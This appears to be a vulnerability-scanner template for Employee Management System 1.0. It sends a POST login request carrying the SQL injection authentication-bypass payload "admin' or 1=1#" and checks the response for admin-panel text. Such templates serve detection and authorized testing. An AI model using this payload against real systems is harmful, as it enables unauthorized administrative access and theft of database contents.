id: ems-sqli
brief:
    title: Employee Management System 1.0 - SQL Injection
    by: arafatansari
    level: critical
    about: Employee Management System 1.0 contains a SQL injection vulnerability via the username parameter.  An attacker can possibly obtain sensitive information from a database, modify data, and execute un...
    label:
        - ems
        - sqli
        - cms
        - auth-bypass
        - edb
        - vuln
    score: CVSS:10.0
moves:
    - verb: POST
      to:
        - '{{BaseURL}}/process/aprocess.php'
      head:
        Content-Type: application/x-www-form-urlencoded
      body: mailuid=admin' or 1=1#&pwd={{rand_base(5)}}&login-submit=Login
      signs:
        - "on": word
          has:
            - Admin Panel
            - Log Out
            - Employee Management System
          in: body
          need: all
        - "on": status
          status:
            - 200
